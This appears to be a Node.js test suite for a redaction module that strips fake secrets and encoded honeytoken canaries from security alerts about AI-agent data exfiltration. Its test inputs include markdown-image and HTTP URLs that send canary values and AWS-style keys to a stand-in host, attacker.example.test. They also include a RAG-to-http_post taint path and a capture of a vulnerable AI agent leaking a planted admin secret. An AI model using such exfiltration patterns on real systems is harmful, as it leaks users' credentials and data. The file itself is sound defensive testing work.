import { test } from 'node:test';
import assert from 'node:assert/strict';
import { buildAlert, BOUNDS } from '../schema.js';
import { redactString, sha256Short } from '../redact.js';
import { makeVerdict, warnSink } from './helpers.js';

// Fake, test-only secret shapes (no real credentials). Built by concatenation so the repo never
// contains a contiguous secret-looking literal that a scanner would flag.
const FAKE = {
  aws: 'AKIA' + 'TESTONLY' + 'ABCDEFGH',
  github: 'ghp_' + 'T'.repeat(36),
  sk: 'sk-' + 'testonly' + 'X'.repeat(24),
  slack: 'xoxb-' + '1234567890-testonly',
  jwt: 'eyJ' + 'hbGciOiJIUzI1' + '.' + 'eyJzdWIiOiJ0ZXN0' + '.' + 'c2lnbmF0dXJlX3Rlc3Q',
  bearer: 'Bearer ' + 'tok' + 'Q'.repeat(30),
  pem: '-----BEGIN RSA PRIVATE KEY-----\nMIIEtestonly\n-----END RSA PRIVATE KEY-----',
  password: 'password=' + 'Hunter2' + 'TestOnly',
  ssn: '123-45-' + '6789',
  card: '4111 1111 ' + '1111 1111',
};
const CANARY = { id: 'DVAA-CANARY-07', value: 'dvaa_canary_' + '9f8e7d6c5b4a' };

const secretValue = (k) =>
  k === 'bearer' ? FAKE.bearer.slice(7) : k === 'password' ? FAKE.password.slice(9) : FAKE[k];

test('every secret pattern is redacted to kind + hash', () => {
  for (const [k, s] of Object.entries(FAKE)) {
    const { value, findings } = redactString(`prefix ${s} suffix`);
    assert.ok(!value.includes(secretValue(k)), `${k} leaked: ${value}`);
    assert.match(value, /\[REDACTED:[a-z_]+:sha256=[0-9a-f]{16}\]/, k);
    assert.ok(findings.length >= 1, k);
  }
});

test('secrets glued to surrounding word characters are still redacted', () => {
  for (const k of ['aws', 'github', 'sk', 'slack', 'jwt']) {
    const { value } = redactString(`xyz${FAKE[k]}abc`);
    assert.ok(!value.includes(FAKE[k].slice(0, 12)), `${k} glued leak: ${value}`);
  }
});

test('non-secrets are left alone (no Luhn-failing numbers, no plain words)', () => {
  for (const s of ['order 1234 5678 9012 3456 shipped', 'the token bucket', 'sha256=0123456789012345']) {
    assert.equal(redactString(s).value, s);
  }
});

test('no secret value anywhere in the alert body; canary kept as id + hash only', () => {
  const { onWarning } = warnSink();
  const blob = Object.values(FAKE).join(' | ') + ' | ' + CANARY.value;
  const v = makeVerdict('honeytoken_exfil', 0, {
    canary: CANARY,
    evidence: `exfil payload: ${blob}`,
    caseCard: { originatedIn: `doc containing ${CANARY.value}` },
    taintPath: [
      { kind: 'source', label: `rag:${FAKE.aws}` },
      { kind: 'sink', label: `http_post body=${CANARY.value}` },
    ],
  });
  v.entities.toolCall.argsPreview = JSON.stringify({ body: blob });
  v.entities.sink.destination = `https://attacker.example.test/c?k=${CANARY.value}&a=${FAKE.aws}`;
  const a = buildAlert(v, { onWarning });
  const json = JSON.stringify(a);
  for (const k of Object.keys(FAKE)) assert.ok(!json.includes(secretValue(k)), `${k} value leaked into alert`);
  assert.ok(!json.includes(CANARY.value), 'canary value leaked into alert');
  assert.deepEqual(a.Canary, { Id: CANARY.id, ValueSha256: sha256Short(CANARY.value) });
  assert.ok(json.includes(`[REDACTED:canary:${CANARY.id}:sha256=${sha256Short(CANARY.value)}]`));
  assert.ok(a.Redactions.Count >= Object.keys(FAKE).length + 1);
  assert.ok(a.Redactions.Samples.some((s) => s.CanaryId === CANARY.id));
});

test('redaction happens BEFORE truncation: a secret straddling the cut never leaks a partial', () => {
  const { onWarning } = warnSink();
  const S = BOUNDS.MAX_STRING_CHARS;
  // Slide the secret across every offset around the truncation boundary.
  for (let off = S - 260; off <= S + 20; off++) {
    // glued to word chars on the left (no \b) AND separated by a space — both must be caught
    const evidence = (off % 2 ? 'e'.repeat(off) : 'e'.repeat(off - 1) + ' ') + FAKE.aws + ' ' + 'f'.repeat(4000);
    const a = buildAlert(makeVerdict('egress_secret_pattern', off, { evidence }), { onWarning });
    // any 8-char prefix of the key would be a partial leak
    assert.ok(!a.Evidence.includes(FAKE.aws.slice(0, 8)), `partial secret leaked at offset ${off}`);
    assert.ok(a.Evidence.length <= S);
  }
});

test('data-rich: 300 alerts each carrying a distinct canary — none leak', () => {
  const { onWarning } = warnSink();
  for (let i = 0; i < 300; i++) {
    const c = { id: `C-${i}`, value: `dvaa_canary_${i}_` + 'k'.repeat(12) };
    const a = buildAlert(makeVerdict('honeytoken_exfil', i, { canary: c, evidence: `body=${c.value}` }), { onWarning });
    assert.ok(!JSON.stringify(a).includes(c.value), `canary ${i} leaked`);
    assert.equal(a.Canary.Id, c.id);
  }
});

// ---- Review S1 (PR #3): encoded / varied canary forms ---------------------------------------------
// A canary with characters that change under URL-encoding, so encodeURIComponent != raw.
const CANARY2 = { id: 'DVAA-CANARY-08', value: 'dvaa canary/' + '7a6b+5c4d' };

function encodedForms(value) {
  const b = Buffer.from(value, 'utf8');
  const forms = {
    upper: value.toUpperCase(),
    mixedCase: [...value].map((ch, i) => (i % 2 ? ch.toUpperCase() : ch.toLowerCase())).join(''),
    spaced: [...value].join(' '),
    dashed: [...value].join('-'),
    hexLower: b.toString('hex'),
    hexUpper: b.toString('hex').toUpperCase(),
    hexSpaced: b.toString('hex').match(/../g).join(' '),
    percentAll: [...b].map((x) => '%' + x.toString(16).padStart(2, '0').toUpperCase()).join(''),
    uriComponent: encodeURIComponent(value),
  };
  // base64 + base64url of the canary embedded at every alignment inside a larger encoded blob
  for (let k = 0; k < 3; k++) {
    const blob = Buffer.concat([Buffer.from('x'.repeat(k + 7)), b, Buffer.from('&rest=1')]);
    forms[`base64@${k}`] = blob.toString('base64');
    forms[`base64url@${k}`] = blob.toString('base64url');
  }
  return forms;
}

for (const c of [CANARY, CANARY2]) {
  test(`S1: encoded/varied forms of canary ${c.id} are redacted in the alert (base64/url, hex, %XX, case, separators)`, () => {
    const { onWarning } = warnSink();
    for (const [name, form] of Object.entries(encodedForms(c.value))) {
      const v = makeVerdict('egress_markdown_image', 0, {
        canaries: [c],
        evidence: `![x](https://attacker.example.test/p.png?d=${form})`,
      });
      const a = buildAlert(v, { onWarning });
      const json = JSON.stringify(a);
      assert.ok((a.Redactions.ByKind.canary ?? 0) >= 1, `${c.id} ${name}: no canary redaction (form=${form})`);
      assert.ok(json.includes(`[REDACTED:canary:${c.id}:sha256=${sha256Short(c.value)}]`), `${c.id} ${name}: marker missing`);
      // the decoded canary must not be recoverable from what is left of the evidence
      const ev = a.Evidence;
      const rest = ev.replace(/\[REDACTED:[^\]]*\]/g, '');
      const tryDecode = (s) => [s, Buffer.from(s.replace(/[^A-Za-z0-9+/_-]/g, ''), 'base64').toString('latin1'),
        Buffer.from(s.replace(/[^0-9a-fA-F]/g, ''), 'hex').toString('latin1'), (() => { try { return decodeURIComponent(s); } catch { return ''; } })()];
      const needle = c.value.toLowerCase().replace(/[^a-z0-9]/g, '');
      for (const d of tryDecode(rest)) {
        assert.ok(!d.toLowerCase().replace(/[^a-z0-9]/g, '').includes(needle), `${c.id} ${name}: canary recoverable from "${rest}"`);
      }
      // short forms must be gone verbatim; long base64 blobs keep their non-canary bytes (checked by decode above)
      if (form.length <= 24) assert.ok(!json.includes(form), `${c.id} ${name}: form leaked verbatim`);
    }
  });
}

test('S1: encoded canary sitting beyond 8 KB of a data-rich payload is still found (full-payload scan)', () => {
  const b64 = Buffer.from('k='.repeat(5) + CANARY.value).toString('base64');
  const rows = Array.from({ length: 400 }, (_, i) => `{"id":${i},"name":"customer-${i}","tier":"gold"}`).join(',');
  const payload = `[${rows}] ${'p'.repeat(9000)} img=${b64} ${'q'.repeat(9000)}`;
  assert.ok(payload.indexOf(b64) > 8192 && payload.length - payload.indexOf(b64) > 8192);
  const { value, findings } = redactString(payload, { canaries: [CANARY] });
  assert.ok(findings.some((f) => f.kind === 'canary' && f.encoding === 'base64'), JSON.stringify(findings.slice(0, 3)));
  assert.ok(!value.includes(b64));
  const { onWarning } = warnSink();
  const a = buildAlert(makeVerdict('honeytoken_exfil', 1, { canary: CANARY, evidence: payload }), { onWarning });
  assert.ok(a.Redactions.ByKind.canary >= 1);
});

test('S1: canary matching does not over-redact ordinary text, and odd Unicode cannot desync it', () => {
  for (const s of ['dvaa canary documentation', 'hex 0123456789abcdef', 'base64 aGVsbG8gd29ybGQ=']) {
    assert.equal(redactString(s, { canaries: [CANARY] }).value, s);
  }
  // "İ" lowercases to two code units; it must not shift the position map and expose the canary
  const s = 'İİİİ ' + CANARY.value.toUpperCase() + ' İ';
  const { value } = redactString(s, { canaries: [CANARY] });
  assert.ok(!value.toLowerCase().includes(CANARY.value), value);
  assert.match(value, /^İİİİ \[REDACTED:canary:DVAA-CANARY-07:sha256=[0-9a-f]{16}\] İ$/);
});

test('data-rich: 300 alerts each carrying a distinct canary in base64 — none recoverable', () => {
  const { onWarning } = warnSink();
  for (let i = 0; i < 300; i++) {
    const c = { id: `C-${i}`, value: `dvaa_canary_${i}_` + 'k'.repeat(12) };
    const b64 = Buffer.from(`token=${c.value}`).toString('base64url');
    const a = buildAlert(makeVerdict('honeytoken_exfil', i, { canary: c, evidence: `GET /p.png?q=${b64}` }), { onWarning });
    assert.ok(!JSON.stringify(a).includes(b64), `canary ${i} base64 leaked`);
    assert.ok(a.Redactions.ByKind.canary >= 1, `canary ${i} not counted`);
  }
});

test('forged marker in the input cannot smuggle a secret past the pattern scan', () => {
  for (const s of [`[REDACTED: ${FAKE.aws} ]`, `x [REDACTED:${FAKE.github}]`, `[REDACTED:canary:x:sha256=${FAKE.sk}]`]) {
    const { value } = redactString(s);
    for (const k of ['aws', 'github', 'sk']) assert.ok(!value.includes(FAKE[k]), `${k} smuggled: ${value}`);
  }
});

test('real seam: T1 DVAA capture (aim-ab) — exfil secret + SSN in raw, %-encoded and base64 tool args never reach the alert', async () => {
  const fs = await import('node:fs');
  const cap = JSON.parse(fs.readFileSync(new URL('../../../captures/attack/aim-ab.demo.json', import.meta.url), 'utf8'));
  const tc = cap.runA.toolCalls[0];
  const exfil = cap.canary.hits[0].query.data; // what DVAA's canary endpoint actually received
  const secret = 'dvaa-admin-secret'; // DVAA's planted admin credential, treated as a known honeytoken
  assert.ok(tc.function.arguments.includes(encodeURIComponent(exfil)), 'capture carries the %-encoded exfil');
  const { onWarning } = warnSink();
  const v = makeVerdict('honeytoken_exfil', 0, {
    canary: { id: 'HT-ADMIN-01', value: secret },
    evidence: `${cap.runA.message} | b64=${Buffer.from(exfil).toString('base64')} | dvaa=${JSON.stringify(cap.runA.dvaa)}`,
  });
  v.entities.toolCall = { id: tc.id, name: tc.function.name, argsPreview: tc.function.arguments };
  v.entities.sink = { type: 'http', destination: cap.runA.dvaa.exfilTargetUrl ?? cap.canary.url };
  const a = buildAlert(v, { onWarning });
  const json = JSON.stringify(a);
  for (const leak of [secret, encodeURIComponent(secret).toUpperCase(), '123-45-6789', Buffer.from(exfil).toString('base64')]) {
    assert.ok(!json.includes(leak), `leaked: ${leak.slice(0, 40)}`);
  }
  assert.ok(a.Redactions.ByKind.canary >= 2, JSON.stringify(a.Redactions.ByKind)); // raw arg + base64 evidence
  assert.ok(a.Redactions.ByKind.us_ssn >= 1);
});

test('%-encoded secrets (URL query exfil) are redacted via the decoded view, mapped onto the original span', () => {
  const cases = {
    password: `q=1&password%3D${FAKE.password.slice(9)}`,
    ssn: `note=SSN%3A%20${FAKE.ssn}`,
    aws: `k=%22${FAKE.aws}%22`,
    github: `t=${encodeURIComponent(' ' + FAKE.github)}`,
  };
  for (const [k, s] of Object.entries(cases)) {
    const { value, findings } = redactString(s);
    assert.ok(!decodeURIComponent(value.replace(/\[REDACTED:[^\]]*\]/g, '')).includes(secretValue(k)), `${k}: ${value}`);
    assert.ok(findings.length >= 1, k);
  }
});
